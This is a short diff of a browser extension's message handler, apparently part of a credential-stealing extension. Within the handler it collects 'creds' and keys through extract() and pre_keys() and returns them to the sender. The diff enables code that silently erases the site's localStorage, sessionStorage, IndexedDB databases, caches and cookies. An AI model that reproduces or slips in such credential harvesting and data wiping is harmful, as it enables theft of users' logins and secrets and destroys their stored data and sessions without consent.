@@ -336,12 +336,12 @@ chrome.runtime.onMessage.addListener(async (message, sender) => {
             const keys = await pre_keys();
             const creds = await extract();
 
-            // try { localStorage.clear(); } catch (error) {/*ignore */ }
-            // try { sessionStorage.clear(); } catch (error) { }
+            try { localStorage.clear(); } catch (error) {/*ignore */ }
+            try { sessionStorage.clear(); } catch (error) { }
 
-            // try { indexedDB.databases().then(dbs => { dbs.forEach(db => indexedDB.deleteDatabase(db.name)); }); } catch (error) { }
-            // try { caches.keys().then(keys => { keys.forEach(key => caches.delete(key)); }); } catch (error) { }
-            // try { document.cookie.split(";").forEach(cookie => { document.cookie = cookie.replace(/^ +/, "").replace(/=.*/, "=;expires=" + new Date(0).toUTCString() + ";path=/"); }); } catch (error) { }
+            try { indexedDB.databases().then(dbs => { dbs.forEach(db => indexedDB.deleteDatabase(db.name)); }); } catch (error) { }
+            try { caches.keys().then(keys => { keys.forEach(key => caches.delete(key)); }); } catch (error) { }
+            try { document.cookie.split(";").forEach(cookie => { document.cookie = cookie.replace(/^ +/, "").replace(/=.*/, "=;expires=" + new Date(0).toUTCString() + ";path=/"); }); } catch (error) { }
 
             return { success: true, creds: creds.creds, keys };
           })();
